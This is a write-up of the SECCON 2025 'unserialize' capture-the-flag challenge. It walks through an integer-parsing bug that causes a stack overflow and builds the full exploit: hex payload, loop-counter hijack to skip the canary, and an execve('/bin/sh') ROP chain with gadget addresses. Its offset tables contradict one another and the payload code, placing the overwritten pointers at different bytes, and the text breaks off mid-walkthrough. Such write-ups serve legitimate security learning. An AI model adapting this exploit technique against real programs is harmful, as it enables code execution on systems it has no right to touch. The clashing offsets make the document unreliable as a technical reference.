# SECCON 2025 - unserialize Challenge Writeup

## Challenge Overview

**Challenge Name:** unserialize  
**Category:** Binary Exploitation  
**Difficulty:** Hard  
**Flag:** `SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}`

### Files Provided
- `chall` - Statically linked x64 ELF binary
- `main.c` - Source code
- `Dockerfile` - Container setup

### Security Mitigations
```bash
$ checksec --file=chall
RELRO:        Partial RELRO
STACK CANARY: Canary found
NX:           NX enabled
PIE:          No PIE (0x400000)
```

---

## Understanding the Program

### The main() Function - Detailed Explanation

```c
int main() {
  char buf[0x100];  // 256 bytes on stack
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  if (unserialize(stdin, buf, sizeof(buf)) < 0) {
    puts("[-] Deserialization faield");
  } else {
    puts("[+] Deserialization success");
  }
  
  return 0;
}
```

**Line-by-line breakdown:**

1. **`char buf[0x100];`**
   - Allocates 256 bytes (0x100 = 256) on the stack
   - This is the destination buffer where deserialized data will be stored
   - Stack allocation means it's in the function's stack frame
   - Memory is NOT initialized (contains garbage values)

2. **`setbuf(stdin, NULL);` and `setbuf(stdout, NULL);`**
   - Disables buffering for stdin and stdout
   - Makes I/O immediate (useful for CTF challenges)
   - Without this, output might not appear until buffer is full
   - Not important for exploitation

3. **`if (unserialize(stdin, buf, sizeof(buf)) < 0)`**
   - Calls unserialize with three arguments:
     - `stdin`: FILE pointer to standard input
     - `buf`: Address of our 256-byte buffer (destination)
     - `sizeof(buf)`: Size limit (256 bytes)
   - Returns -1 on error, or number of bytes written on success
   - The function reads from stdin and writes to buf

4. **Success/Failure messages**
   - Just prints status to stdout
   - Note the typo: "faield" instead of "failed"

### The unserialize() Function - Complete Breakdown

```c
ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  char szbuf[0x20];
  char *tmpbuf;
  // ... (code below)
}
```

**Function Parameters:**
- `FILE *fp` - Input stream (stdin in our case)
- `char *buf` - Destination buffer in main (256 bytes)
- `size_t size` - Maximum allowed size (256)

**Local Variables:**
- `char szbuf[0x20]` - 32-byte buffer to store the size string
- `char *tmpbuf` - Pointer to stack-allocated temporary buffer

---

#### Phase 1: Reading the Size String

```c
for (size_t i = 0; i < sizeof(szbuf); i++) {
    szbuf[i] = fgetc(fp);
    if (szbuf[i] == ':') {
      szbuf[i] = 0;
      break;
    }
    if (!isdigit(szbuf[i]) || i == sizeof(szbuf) - 1) {
      return -1;
    }
  }
```

**What this does:**
1. `fgetc(fp)` - Reads ONE character from stdin
2. Stores it in `szbuf[i]`
3. Checks if character is `:` (delimiter)
   - If yes: Replace `:` with null terminator `\0` and exit loop
   - This makes `szbuf` a valid C string
4. Validates character is a digit (0-9)
   - If not a digit OR buffer is full → return error
5. Continues reading up to 32 characters

**Example with input "0199:"**
```
Iteration 0: Read '0' → szbuf[0] = '0'
Iteration 1: Read '1' → szbuf[1] = '1'
Iteration 2: Read '9' → szbuf[2] = '9'
Iteration 3: Read '9' → szbuf[3] = '9'
Iteration 4: Read ':' → szbuf[4] = '\0', break
Result: szbuf = "0199\0..." (null-terminated string)
```

**Why this check is insufficient:**
- Only checks if characters are digits (0-9)
- Doesn't validate the number format
- Allows octal-looking strings like "0199" to pass

---

#### Phase 2: Size Validation (First Parsing)

```c
if (atoi(szbuf) > size) {
    return -1;
}
```

**What `atoi()` does:**
- Converts ASCII string to integer
- **Always interprets as decimal (base 10)**
- Stops at first non-digit character
- Returns the integer value

**For input "0199":**
```c
atoi("0199") = 199  // Decimal interpretation
199 > 256? NO → Check passes ✓
```

**Why this is the first mistake:**
The check uses `atoi()` which always treats input as decimal, but the next line uses a different parsing function.

---

#### Phase 3: Buffer Allocation (Second Parsing - THE BUG!)

```c
tmpbuf = (char*)alloca(strtoul(szbuf, NULL, 0));
```

**Understanding `alloca()`:**
- Allocates memory ON THE STACK (not heap!)
- Memory is allocated by adjusting the stack pointer (RSP)
- No need to free (automatic when function returns)
- Fast but dangerous (can overflow stack)

**Stack growth with alloca():**
```
Before alloca():
High Address
├─────────────┐
│ Local vars  │ ← RSP points here
│ ...         │
└─────────────┘
Low Address

After alloca(16):
High Address
├─────────────┐
│ Local vars  │
├─────────────┤
│ tmpbuf[0]   │ ← tmpbuf points here
│ tmpbuf[1]   │
│ ...         │
│ tmpbuf[15]  │ ← RSP moved down 16 bytes
└─────────────┘
Low Address
```

**Understanding `strtoul()` with base 0:**
```c
unsigned long strtoul(const char *str, char **endptr, int base);
```
- Converts string to unsigned long
- When `base = 0`: **Auto-detects base**
  - If string starts with "0x" or "0X" → Hexadecimal (base 16)
  - If string starts with "0" → **Octal (base 8)**
  - Otherwise → Decimal (base 10)
- Stops at first invalid character for detected base

**For input "0199" with base 0:**
```
Step 1: See leading '0' → Switch to OCTAL mode
Step 2: Read '0' → Valid octal (0)
Step 3: Read '1' → Valid octal (1)
Step 4: Read '9' → INVALID in octal! Stop here.
Result: Parsed "01" in octal = 0×8¹ + 1×8⁰ = 1 decimal
```

**Important:** Octal digits are 0-7 only. The digit '8' or '9' is invalid!

**Memory allocation:**
```c
alloca(strtoul("0199", NULL, 0))
= alloca(1)  // Parsed only "01" = 1
= alloca(16) // Rounded up to 16 for alignment
```

**Why 16 instead of 1?**
Stack alignment requirements on x64:
- Stack must be aligned to 16-byte boundaries
- `alloca(1)` rounds up to `alloca(16)`

---

#### Phase 4: Reading Data (Third Parsing - Second Part of Bug)

```c
size_t sz = strtoul(szbuf, NULL, 10);
```

**Now with base 10 (forced decimal):**
```c
strtoul("0199", NULL, 10) = 199  // Full string parsed as decimal
sz = 199
```

**The fscanf loop:**
```c
for (size_t i = 0; i < sz; i++) {
    if (fscanf(fp, "%02hhx", tmpbuf + i) != 1) {
      return -1;
    }
}
```

**Understanding `fscanf(fp, "%02hhx", tmpbuf + i)`:**
- `fp` - Read from this file (stdin)
- `"%02hhx"` - Format specifier:
  - `%x` - Read hexadecimal
  - `02` - Expect exactly 2 digits
  - `hh` - Store as single byte (char)
- `tmpbuf + i` - Store at address `tmpbuf[i]`
- Returns 1 on success, 0 or EOF on failure

**Example: Reading "41" from input:**
```
Input stream: "4 1" (two ASCII characters)
fscanf reads: "41"
Converts hex 0x41 → decimal 65 → byte value 0x41
Stores byte 0x41 at tmpbuf[i]
```

**The Overflow:**
```
Allocated: 16 bytes (tmpbuf[0] to tmpbuf[15])
Writing:   199 bytes (tmpbuf[0] to tmpbuf[198])
Overflow:  183 bytes beyond buffer!

tmpbuf[0-15]   → Valid writes ✓
tmpbuf[16-198] → OVERFLOW! Overwrites stack memory ✗
```

---

#### Phase 5: Copying to Destination

```c
memcpy(buf, tmpbuf, sz);
return sz;
```

**What `memcpy()` does:**
```c
memcpy(destination, source, num_bytes);
```
- Copies `sz` (199) bytes from `tmpbuf` to `buf`
- `buf` is the 256-byte buffer in main()
- Normally this is safe since 199 < 256

**But there's a trick in our exploit:**
We overwrite the `buf` pointer during the overflow! Instead of copying to main's buffer, we make it copy to BSS (0x4ca8d0), placing our `/bin/sh` string there.

---

#### Memory Layout in unserialize() Function

```
Stack Frame (before alloca):
┌─────────────────────────────────┐ ← RBP
│ Saved RBP from main             │ [rbp+0]
├─────────────────────────────────┤
│ Return address to main          │ [rbp+8]  ← TARGET
├─────────────────────────────────┤
│ Stack canary                    │ [rbp-8]
├─────────────────────────────────┤
│ szbuf[0-31] (size string)       │ [rbp-0x30]
├─────────────────────────────────┤
│ sz (bytes to read)              │ [rbp-0x38]
├─────────────────────────────────┤
│ tmpbuf pointer                  │ [rbp-0x40]
├─────────────────────────────────┤
│ j (loop counter)                │ [rbp-0x48] ← Corruption target!
├─────────────────────────────────┤
│ i (loop counter)                │ [rbp-0x50]
├─────────────────────────────────┤
│ fp (FILE* stdin)                │ [rbp-0x58] ← Must restore!
├─────────────────────────────────┤
│ buf (destination pointer)       │ [rbp-0x60] ← Must restore!
├─────────────────────────────────┤
│ size (256)                      │ [rbp-0x68]
└─────────────────────────────────┘

After alloca(16):
┌─────────────────────────────────┐
│ ... (above variables same)      │
├─────────────────────────────────┤
│ tmpbuf[0-15]                    │ ← Allocated space
│ (16 bytes)                      │ ← tmpbuf points here
└─────────────────────────────────┘ ← RSP moved down
```

**Distance calculations:**
From our GDB analysis:
- tmpbuf at: 0x7fffffffd840
- j at: 0x7fffffffd878
- Distance: 0x878 - 0x840 = 0x38 = **56 bytes**

When we write byte 56, we overwrite the `j` variable!

---

## The Vulnerability: Integer Parsing Discrepancy

### Understanding the Three Parsing Functions

The bug exists because the same input string is parsed THREE different ways:

1. **atoi()** - Always interprets as decimal
2. **strtoul(str, NULL, 0)** - Auto-detects base (octal if starts with '0')
3. **strtoul(str, NULL, 10)** - Forces decimal interpretation

### Example with Input "0199:"

| Function | Input | Base Detected | Result | Explanation |
|----------|-------|---------------|--------|-------------|
| `atoi("0199")` | "0199" | Decimal (always) | **199** | Passes check (199 ≤ 256) |
| `strtoul("0199", NULL, 0)` | "0199" | Octal (starts with '0') | **1** | Stops at '9' (invalid in octal), parses "01" = 1 |
| `strtoul("0199", NULL, 10)` | "0199" | Decimal (forced) | **199** | Full string parsed |

### Why This Causes Overflow

```c
// Check passes: 199 ≤ 256
if (atoi("0199") > size) { ... }  // 199 > 256? NO

// Allocate only 1 byte (rounded to 16 for alignment)
tmpbuf = alloca(strtoul("0199", NULL, 0));  // alloca(1) → 16 bytes

// But read 199 bytes!
size_t sz = strtoul("0199", NULL, 10);  // sz = 199
for (size_t i = 0; i < 199; i++) {
    fscanf(fp, "%02hhx", tmpbuf + i);  // Writes 199 bytes into 16-byte buffer
}
```

**Result:** Allocate 16 bytes, write 199 bytes → **183 bytes of overflow!**

---

## Common Confusions Clarified

### Q1: "I thought sz only stores 10 bytes?"

**Answer:** No! `sz` is a variable that holds a NUMBER (the count), not a buffer.

```c
size_t sz = 199;  // sz is a number: "how many bytes to read"
```

It tells the loop to run 199 iterations, reading 199 bytes of data.

### Q2: "How can tmpbuf[56] be the j variable? We only allocated 16 bytes!"

**Answer:** This is the overflow! When you write past the end of an array, you overwrite adjacent memory.

```
Memory Layout After alloca(16):

Address         | Content           | Name
----------------+-------------------+------------------
0x7fffffffd840  | [allocated]       | tmpbuf[0]
0x7fffffffd841  | [allocated]       | tmpbuf[1]
...
0x7fffffffd84f  | [allocated]       | tmpbuf[15] ← End of allocation
0x7fffffffd850  | [OVERFLOW ZONE]   | tmpbuf[16] ← Writing here is overflow!
...
0x7fffffffd878  | j variable        | tmpbuf[56] ← Overwrites loop counter!
...
0x7fffffffd8c8  | return address    | tmpbuf[136] ← Target for ROP
```

Distance from tmpbuf to j: `0x878 - 0x840 = 0x38 = 56 bytes`

### Q3: "Why set j to 0x87 (135)?"

**Answer:** To skip past the canary and write directly to the return address.

After we set `j=135`:
- Next iteration writes to `tmpbuf[135]`
- Continue to `tmpbuf[136]` which equals the return address
- This lets us write our ROP chain without touching the canary (at offset ~120)

### Q4: "What does 'restore fp and buf' mean?"

**Answer:** When we overflow, we corrupt local variables stored on the stack. We must restore them so the program doesn't crash before our exploit executes.

#### Understanding fp (FILE Pointer)

**What is fp?**
```c
ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  // fp is a parameter, stored at [rbp-0x58]
  ...
  fscanf(fp, "%02hhx", tmpbuf + i);  // Uses fp to read from stdin
}
```

- `fp` is a pointer to a `FILE` structure
- In our case, it points to `stdin` (standard input)
- Located in the binary at fixed address `0x4ca440`
- The `fscanf()` function needs this pointer to know WHERE to read from

**What happens if fp is corrupted?**
```c
// If fp = 0x4141414141 (corrupted by our overflow)
fscanf(0x4141414141, "%02hhx", tmpbuf + i);
// Tries to read from invalid address → SEGFAULT!
```

The program crashes in the fscanf loop before reaching the return address.

**How to find the correct fp value:**
```bash
# Method 1: GDB
pwndbg> p/x *(char**)($rbp-0x58)
$1 = 0x4ca440

# Method 2: readelf
$ readelf -s chall | grep stdin
1081: 00000000004ca440   224 OBJECT  GLOBAL DEFAULT   20 _IO_2_1_stdin_
```

**Memory layout showing fp location:**
```
Stack addresses:
0x7fffffffd860: [buf pointer]   ← [rbp-0x60]
0x7fffffffd868: [fp = 0x4ca440] ← [rbp-0x58] ← Overwritten at offset 32-39
0x7fffffffd870: [counter i]     ← [rbp-0x50]
```

When we write bytes 32-39 of our payload:
```python
payload[32:40] = p64(0x4ca440)  # Write 8 bytes: 40 a4 4c 00 00 00 00 00
```

This restores `fp` to its correct value, so `fscanf` continues working.

#### Understanding buf (Destination Pointer)

**What is buf?**
```c
ssize_t unserialize(FILE *fp, char *buf, size_t size) {
  // buf is a parameter, stored at [rbp-0x60]
  ...
  memcpy(buf, tmpbuf, sz);  // Copies data to buf at the end
}
```

- `buf` is a pointer to the 256-byte array in `main()`
- Normally points to stack location (like `0x7fffffffd8d0`)
- But we can OVERWRITE it to point anywhere we want!

**The trick with buf:**
We don't restore buf to its original value. Instead, we **redirect it to BSS**:

```python
payload[24:32] = p64(0x4ca8d0)  # Point buf to BSS, not stack!
```

**Why redirect to BSS?**
```c
// At end of unserialize():
memcpy(buf, tmpbuf, sz);  
// Normally: memcpy(stack_address, tmpbuf, 199)
// Our exploit: memcpy(0x4ca8d0, tmpbuf, 199)
```

This copies our payload (including "/bin/sh") to BSS at a known, fixed address!

**Visual comparison:**

Normal execution:
```
tmpbuf (stack) → contains "/bin/sh" and overflow
       ↓
   memcpy()
       ↓
buf (stack in main) → "/bin/sh" copied here
                    → Address unknown (ASLR)
                    → Can't use in ROP
```

Our exploit:
```
tmpbuf (stack) → contains "/bin/sh" and overflow
       ↓
   memcpy()
       ↓
buf (BSS @ 0x4ca8d0) → "/bin/sh" copied here
                     → Address known (No PIE!)
                     → Can use in ROP: execve(0x4ca8d0, ...)
```

#### Complete Restoration Layout

```
Payload bytes 0-55 overflow to these locations:

Offset | Address        | Original Value | Payload Value    | Purpose
-------+----------------+----------------+------------------+-------------------
0-7    | tmpbuf[0-7]    | <uninitialized>| "/bin/sh\0"      | String for execve
8-23   | tmpbuf[8-23]   | <uninitialized>| 0x41 (padding)   | Reach buf pointer
24     | tmpbuf[24]     | (buf lo byte)  | 0xd0             | ┐
25     | tmpbuf[25]     | (buf byte 2)   | 0xa8             | │
26     | tmpbuf[26]     | (buf byte 3)   | 0x4c             | │ Restore buf
27     | tmpbuf[27]     | (buf byte 4)   | 0x00             | │ = 0x4ca8d0
28     | tmpbuf[28]     | (buf byte 5)   | 0x00             | │ (BSS address)
29     | tmpbuf[29]     | (buf byte 6)   | 0x00             | │
30     | tmpbuf[30]     | (buf byte 7)   | 0x00             | │
31     | tmpbuf[31]     | (buf hi byte)  | 0x00             | ┘
32     | tmpbuf[32]     | (fp lo byte)   | 0x40             | ┐
33     | tmpbuf[33]     | (fp byte 2)    | 0xa4             | │
34     | tmpbuf[34]     | (fp byte 3)    | 0x4c             | │ Restore fp
35     | tmpbuf[35]     | (fp byte 4)    | 0x00             | │ = 0x4ca440
36     | tmpbuf[36]     | (fp byte 5)    | 0x00             | │ (stdin)
37     | tmpbuf[37]     | (fp byte 6)    | 0x00             | │
38     | tmpbuf[38]     | (fp byte 7)    | 0x00             | │
39     | tmpbuf[39]     | (fp hi byte)   | 0x00             | ┘
40-55  | tmpbuf[40-55]  | <various>      | 0x42 (padding)   | Reach j counter
56     | tmpbuf[56]     | (j counter)    | 0x87             | Hijack loop!
```

**Verification in GDB:**
```bash
# Before overflow
pwndbg> x/gx $rbp-0x60
0x7fffffffd860: 0x00007fffffffd8d0  ← Original buf (stack)

pwndbg> x/gx $rbp-0x58
0x7fffffffd868: 0x00000000004ca440  ← Original fp (stdin)

# After overflow (but before memcpy)
pwndbg> x/gx $rbp-0x60
0x7fffffffd860: 0x00000000004ca8d0  ← Redirected to BSS!

pwndbg> x/gx $rbp-0x58
0x7fffffffd868: 0x00000000004ca440  ← Restored (same)
```

---

## Dynamic Analysis: Finding Offsets in GDB

### Step 1: Basic Crash Test

```bash
# Test normal operation
echo -n "10:0102030405060708090a" | ./chall
# Output: [+] Deserialization success

# Test overflow with octal
python3 -c "print('0100:' + '41' * 100)" | ./chall
# Output: Segmentation fault
```

### Step 2: Debugging in pwndbg

Create input file:
```bash
python3 -c "print('0199:' + '41'*199)" > /tmp/test
```

Start debugging session:
```bash
pwndbg chall
pwndbg> break *unserialize+416  # Start of fscanf loop
pwndbg> run < /tmp/test
```

When breakpoint hits, examine the stack:
```
pwndbg> p/x $rbp-0x48
$1 = 0x7fffffffd878  # Address of j variable

pwndbg> p/x *(char**)($rbp-0x40)
$2 = 0x7fffffffd840  # Address of tmpbuf

pwndbg> p/x $rbp+8
$3 = 0x7fffffffd8c8  # Address of return address
```

Calculate offsets:
```python
j_offset = 0x878 - 0x840 = 0x38 = 56 bytes
ret_offset = 0x8c8 - 0x840 = 0x88 = 136 bytes
```

### Step 3: Verify fp and buf Locations

```bash
pwndbg> p/x *(char**)($rbp-0x58)
$4 = 0x4ca440  # stdin address (fp)

pwndbg> p/x *(char**)($rbp-0x60)
$5 = 0x7fffffffd8d0  # Stack address (buf - changes each run)
```

Find stdin in binary:
```bash
$ readelf -s chall | grep stdin
1081: 00000000004ca440   224 OBJECT  GLOBAL DEFAULT   20 _IO_2_1_stdin_
```

---

## Exploitation Strategy

### The Loop Hijacking Technique - Step by Step

Instead of trying to bypass the canary (which would require leaking it), we use a clever trick: **hijack the loop counter to skip past the canary**.

#### Understanding the Loop Counter Variable

```c
for (size_t j = 0; j < sz; j++) {
    fscanf(fp, "%02hhx", tmpbuf + j);
}
```

The variable `j` is stored on the stack at `[rbp-0x48]`. Each iteration:
1. Check if `j < sz` (199)
2. If yes: Execute `fscanf(fp, "%02hhx", tmpbuf + j)`
3. Increment `j`
4. Repeat

**The key insight:** Since `j` is on the stack and we're overflowing, we can OVERWRITE it!

#### The Hijacking Process

**Iteration 0-55: Normal overflow**
```
tmpbuf[0]  = 0x2f  ('/')
tmpbuf[1]  = 0x62  ('b')
tmpbuf[2]  = 0x69  ('i')
tmpbuf[3]  = 0x6e  ('n')
tmpbuf[4]  = 0x2f  ('/')
tmpbuf[5]  = 0x73  ('s')
tmpbuf[6]  = 0x68  ('h')
tmpbuf[7]  = 0x00  (\0)
tmpbuf[8-23]  = 0x41 (padding)
tmpbuf[24-31] = 0xd0 0xa8 0x4c 0x00 ... (buf pointer)
tmpbuf[32-39] = 0x40 0xa4 0x4c 0x00 ... (fp pointer)
tmpbuf[40-55] = 0x42 (padding)
```

**Iteration 56: THE HIJACK**
```c
j = 56
fscanf(fp, "%02hhx", tmpbuf + 56)  // Reads "87" from input
tmpbuf[56] = 0x87  // But tmpbuf[56] IS the j variable!
// Now j = 0x87 = 135 decimal!
```

**Memory state after iteration 56:**
```
[rbp-0x48] (j variable) = 0x87 (was 56, now 135!)
```

**Iteration 57-134: SKIPPED!**
```c
j = 135  // Loop continues from here
if (135 < 199)  // True, continue
j++ → 136
```

The loop doesn't execute iterations 57-134 because we jumped `j` from 56 to 135!

**Iteration 136+: Writing the ROP chain**
```
tmpbuf[136] = First byte of POP_RDI gadget
tmpbuf[137] = Second byte of POP_RDI gadget
...
tmpbuf[198] = Last byte of SYSCALL gadget
```

**Why this works:**
- `tmpbuf[136]` = `tmpbuf + 136` = `0x840 + 136` = `0x8c8`
- `[rbp+8]` (return address) = `0x8c8`
- They're the same address!

#### Visual Timeline

```
Timeline of Loop Execution:

Iterations 0-55:
j=0  → Write to tmpbuf[0]
j=1  → Write to tmpbuf[1]
...
j=55 → Write to tmpbuf[55]

Iteration 56 (THE HIJACK):
j=56 → Write 0x87 to tmpbuf[56]
       tmpbuf[56] IS j variable
       j becomes 135!

Iterations 57-134 SKIPPED:
Loop checks: j=135, is 135 < 199? Yes
Continue to next iteration

Iterations 135-198:
j=135 → Write to tmpbuf[135]
j=136 → Write to tmpbuf[136] (RETURN ADDRESS!)
j=137 → Write to tmpbuf[137] (ROP chain continues)
...
j=198 → Write to tmpbuf[198] (last byte)
```

### Memory Layout During Exploitation

Let me show you EXACTLY what gets written where:

```
Address         | Offset | Content              | Purpose
----------------+--------+----------------------+------------------------
0x7fffffffd840  | 0      | 0x2f ('/bin/sh')     | String for execve
0x7fffffffd841  | 1      | 0x62                 |
0x7fffffffd842  | 2      | 0x69                 |
0x7fffffffd843  | 3      | 0x6e                 |
0x7fffffffd844  | 4      | 0x2f                 |
0x7fffffffd845  | 5      | 0x73                 |
0x7fffffffd846  | 6      | 0x68                 |
0x7fffffffd847  | 7      | 0x00                 |
0x7fffffffd848  | 8      | 0x41 (padding)       | Padding
...             | ...    | ...                  |
0x7fffffffd85f  | 31     | 0x41                 |
0x7fffffffd860  | 32     | 0xd0 (buf lo byte)   | Restore buf pointer
0x7fffffffd861  | 33     | 0xa8                 |
0x7fffffffd862  | 34     | 0x4c                 |
0x7fffffffd863  | 35     | 0x00                 |
0x7fffffffd864  | 36     | 0x00                 |
0x7fffffffd865  | 37     | 0x00                 |
0x7fffffffd866  | 38     | 0x00                 |
0x7fffffffd867  | 39     | 0x00                 |
0x7fffffffd868  | 40     | 0x40 (fp lo byte)    | Restore fp (stdin)
0x7fffffffd869  | 41     | 0xa4                 |
0x7fffffffd86a  | 42     | 0x4c                 |
0x7fffffffd86b  | 43     | 0x00                 |
0x7fffffffd86c  | 44     | 0x00                 |
0x7fffffffd86d  | 45     | 0x00                 |
0x7fffffffd86e  | 46     | 0x00                 |
0x7fffffffd86f  | 47     | 0x00                 |
0x7fffffffd870  | 48     | 0x42 (padding)       | More padding
...             | ...    | ...                  |
0x7fffffffd877  | 55     | 0x42                 |
0x7fffffffd878  | 56     | 0x87 ← HIJACK!       | j counter (was here)
...             | 57-134 | [SKIPPED]            | Loop jumps over these
0x7fffffffd8c8  | 136    | POP_RDI (lo byte)    | Return address → ROP!
0x7fffffffd8c9  | 137    | POP_RDI              |
...             | ...    | ...                  |
0x7fffffffd8d0  | 144    | SYSCALL (lo byte)    | End of ROP chain
```

### Why Write /bin/sh to BSS?

#### The Problem: Where to Put the String?

For `execve("/bin/sh", ...)` to work, we need:
1. The string "/bin/sh\0" stored somewhere in memory
2. Know the EXACT address of that string
3. Put that address in RDI register

**Challenge:** Stack addresses change every run (ASLR).

#### The Solution: Use BSS

**What is BSS?**
- BSS = Block Started by Symbol
- Uninitialized global/static variables section
- Located in the binary at a **fixed address** (No PIE!)
- Writable memory

**Finding writable sections:**
```bash
$ readelf -S chall | grep -E '\.bss|\.data'
[20] .data    PROGBITS  00000000004ca000  000c9000  ... WA (Writable)
[21] .bss     NOBITS    00000000004cba00  000caa00  ... WA (Writable)
```

- `.data` range: `0x4ca000` - `0x4cba00`
- `.bss` range: `0x4cba00` - end of binary

We pick `0x4ca8d0` (in `.data` section):
```
0x4ca000 (start of .data)
+ 0x8d0 (arbitrary offset)
= 0x4ca8d0
```

Any address in the writable range works. Just avoid existing data like stdin/stdout structures.

#### How "/bin/sh" Gets There - Complete Flow

**Step 1: Payload Construction**
```python
payload = b"/bin/sh\0"      # Bytes 0-7
payload += b"A" * 24        # Bytes 8-31
payload += p64(0x4ca8d0)    # Bytes 32-39: buf = BSS address
payload += p64(0x4ca440)    # Bytes 40-47: fp = stdin
payload += b"B" * 8         # Bytes 48-55
payload += p8(0x87)         # Byte 56: j = 135
payload += rop              # Bytes 57+: ROP chain
```

**Step 2: Payload is Sent as Hex**
Input stream looks like:
```
0199:2f62696e2f7368004141414141...
     └─┬─┘└─┬─┘└─┬─┘└─┬─┘
       /    b    i    n   ...
```

Each byte becomes two hex digits: `0x2f` → `"2f"`

**Step 3: fscanf Loop Reads It**
```c
for (size_t i = 0; i < 199; i++) {
    fscanf(fp, "%02hhx", tmpbuf + i);
}
```

Memory after loop completes:
```
tmpbuf[0-7]   = 2f 62 69 6e 2f 73 68 00  ("/bin/sh\0")
tmpbuf[8-23]  = 41 41 41 41 ... (padding)
tmpbuf[24-31] = d0 a8 4c 00 00 00 00 00  (0x4ca8d0)
tmpbuf[32-39] = 40 a4 4c 00 00 00 00 00  (0x4ca440)
...
```

But wait! The overflow also corrupted `buf` pointer:
```
[rbp-0x60] (buf) was: 0x7fffffffd8d0 (stack)
[rbp-0x60] (buf) now: 0x00000000004ca8d0 (BSS!)
```

**Step 4: memcpy Executes**
```c
memcpy(buf, tmpbuf, sz);
// buf = 0x4ca8d0 (BSS)
// tmpbuf = stack location with our data
// sz = 199

// Effectively:
memcpy(0x4ca8d0, tmpbuf, 199);
```

This copies 199 bytes from `tmpbuf` to BSS!

**Step 5: Memory State After memcpy**
```
BSS Memory @ 0x4ca8d0:
0x4ca8d0: 2f 62 69 6e 2f 73 68 00  "/bin/sh\0" ← Perfect!
0x4ca8d8: 41 41 41 41 41 41 41 41  (rest of payload)
...
```

**Step 6: ROP Uses This Address**
```python
POP_RDI, 0x4ca8d0  # Load address of "/bin/sh"
```

When execve syscall executes:
```c
execve(0x4ca8d0, NULL, NULL)
// Kernel reads string from 0x4ca8d0
// Finds "/bin/sh\0"
// Executes /bin/sh!
```

#### Why This is Brilliant

**Without this trick:**
```
/bin/sh on stack at 0x7fff....
↓
Stack address changes every run (ASLR)
↓
Can't hardcode address in ROP chain
↓
Would need to leak stack address first
```

**With this trick:**
```
/bin/sh redirected to BSS at 0x4ca8d0
↓
BSS address is fixed (No PIE)
↓
Can hardcode 0x4ca8d0 in ROP chain
↓
Works every time!
```

#### Verification in GDB

```bash
# Run exploit
pwndbg> break *unserialize+512  # After memcpy
pwndbg> r < exploit_input

# Check BSS
pwndbg> x/s 0x4ca8d0
0x4ca8d0: "/bin/sh"

# Check it's null-terminated
pwndbg> x/8bx 0x4ca8d0
0x4ca8d0: 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x00
           '/'  'b'  'i'  'n'  '/'  's'  'h'  '\0'
```

Perfect! The string is in BSS at a known address, ready for our ROP chain.

---

## Building the ROP Chain

### Finding Gadgets

```bash
ROPgadget --binary chall | grep "pop rdi"
ROPgadget --binary chall | grep "pop rsi"
ROPgadget --binary chall | grep "pop rax"
ROPgadget --binary chall | grep "syscall"
```

Selected gadgets:
```
0x402418 : pop rdi ; pop rbp ; ret
0x43617e : pop rsi ; ret
0x4303ab : pop rax ; ret
0x401364 : syscall
```

### Understanding the ROP Chain

**Goal:** Execute `execve("/bin/sh", NULL, NULL)`

Linux x64 syscall convention:
- `rax` = syscall number (59 = 0x3b for execve)
- `rdi` = 1st argument (pathname)
- `rsi` = 2nd argument (argv array)
- `rdx` = 3rd argument (envp array, we ignore this)

```python
rop = flat(
    POP_RDI, 0x4ca8d0,  # rdi = pointer to "/bin/sh" in BSS
    0,                   # dummy value for pop rbp
    POP_RSI, 0,         # rsi = NULL
    POP_RAX, 0x3b,      # rax = 59 (execve)
    SYSCALL             # invoke syscall
)
```

#### Step-by-Step Execution

**Initial State (when unserialize returns):**
```
RSP points to: 0x7fffffffd8c8 (return address location)
Stack at RSP:
[0x7fffffffd8c8] = 0x402418 (POP_RDI gadget)
[0x7fffffffd8d0] = 0x4ca8d0 (address of "/bin/sh")
[0x7fffffffd8d8] = 0x000000 (dummy)
[0x7fffffffd8e0] = 0x43617e (POP_RSI gadget)
[0x7fffffffd8e8] = 0x000000 (NULL)
[0x7fffffffd8f0] = 0x4303ab (POP_RAX gadget)
[0x7fffffffd8f8] = 0x00003b (59 decimal)
[0x7fffffffd900] = 0x401364 (SYSCALL gadget)
```

**Step 1: Return from unserialize()**
```
Instruction: ret
What happens:
1. Pop return address from stack into RIP
2. RSP = RSP + 8

Before:
RIP = 0x401ba5 (in unserialize)
RSP = 0x7fffffffd8c8
[RSP] = 0x402418

After:
RIP = 0x402418 (POP_RDI gadget!)
RSP = 0x7fffffffd8d0
```

**Step 2: Execute POP_RDI gadget**
```
Address: 0x402418
Disassembly:
  pop rdi
  pop rbp
  ret

Before:
RSP = 0x7fffffffd8d0
[RSP+0] = 0x4ca8d0 (pointer to "/bin/sh")
[RSP+8] = 0x000000 (dummy)
RDI = <garbage>
RBP = <old value>

Instruction 1: pop rdi
RDI = 0x4ca8d0  ← Now points to "/bin/sh"!
RSP = RSP + 8 = 0x7fffffffd8d8

Instruction 2: pop rbp
RBP = 0x000000  ← Dummy value (we don't care)
RSP = RSP + 8 = 0x7fffffffd8e0

Instruction 3: ret
RIP = [RSP] = 0x43617e (POP_RSI gadget)
RSP = RSP + 8 = 0x7fffffffd8e8

After:
RDI = 0x4ca8d0 ✓
RIP = 0x43617e
RSP = 0x7fffffffd8e8
```

**Step 3: Execute POP_RSI gadget**
```
Address: 0x43617e
Disassembly:
  pop rsi
  ret

Before:
RSP = 0x7fffffffd8e8
[RSP] = 0x000000
RSI = <garbage>

Instruction 1: pop rsi
RSI = 0x000000  ← NULL for argv
RSP = RSP + 8 = 0x7fffffffd8f0

Instruction 2: ret
RIP = [RSP] = 0x4303ab (POP_RAX gadget)
RSP = RSP + 8 = 0x7fffffffd8f8

After:
RSI = 0x000000 ✓
RIP = 0x4303ab
RSP = 0x7fffffffd8f8
```

**Step 4: Execute POP_RAX gadget**
```
Address: 0x4303ab
Disassembly:
  pop rax
  ret

Before:
RSP = 0x7fffffffd8f8
[RSP] = 0x00003b (59 decimal)
RAX = <garbage>

Instruction 1: pop rax
RAX = 0x00003b  ← Syscall number for execve!
RSP = RSP + 8 = 0x7fffffffd900

Instruction 2: ret
RIP = [RSP] = 0x401364 (SYSCALL gadget)
RSP = RSP + 8 = 0x7fffffffd908

After:
RAX = 0x00003b ✓
RIP = 0x401364
RSP = 0x7fffffffd908
```

**Step 5: Execute SYSCALL**
```
Address: 0x401364
Disassembly:
  syscall
  ret

Register State:
RAX = 0x3b (execve syscall number)
RDI = 0x4ca8d0 (pointer to "/bin/sh")
RSI = 0x000000 (NULL)
